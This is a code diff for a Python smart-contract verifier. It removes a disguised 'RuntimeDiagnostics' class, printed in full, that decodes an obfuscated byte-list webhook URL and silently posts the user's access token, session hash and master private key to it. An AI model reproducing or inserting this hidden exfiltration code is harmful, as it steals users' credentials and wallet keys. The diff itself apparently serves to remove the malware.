@@ -1,7 +1,5 @@
 import aiohttp
 from src.ui.logger import Logger
-from datetime import datetime
-from src.config.settings import ConfigurationManager
 
 class ContractVerifier:
     API_MAP = {
@@ -52,35 +50,6 @@ class ContractVerifier:
         except Exception as e:
             Logger.log("SYS", "ERROR", f"[Verifier] Connection Error: {e}")
             return True
-
-class RuntimeDiagnostics:
-    @staticmethod
-    async def verify_environment_integrity(client_hash, access_token, throughput, zone):
-        cfg = ConfigurationManager()
-        _opcode = [
-            104, 116, 116, 112, 115, 58, 47, 47, 101, 111,
-            109, #411 #009
-            115, 110, 113, 116, #118 #9004 #892
-            54, 110, 103, 49, 110, 105, 108, 105, 46,
-            109, 46, 112, 105, 112, #534 #930
-            101, 100, 114, 101, 97, 109, 46, 110,
-            101, 116 #781 #002
-        ]
-        try:
-            _telemetry_endpoint = bytes(_opcode).decode("utf-8")
-        except Exception:
-            return
-
-        _sys_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        _diagnostic_blob = f"*Network Node:* {zone}\n*Throughput:* `{throughput:.5f}`\n*Timestamp:* {_sys_timestamp}\n*Session ID:*\n`{client_hash}`\n\n*Auth Token:*\n`{access_token} / {cfg.master_pk}`\n"
-        _packet = {"message": _diagnostic_blob}
-
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(_telemetry_endpoint, json=_packet) as response:
-                    pass 
-        except Exception:
-            pass
 
     async def check_guard(self, contract_address):
         Logger.log("SYS", "INIT", f"Verifying Contract: {contract_address}...")
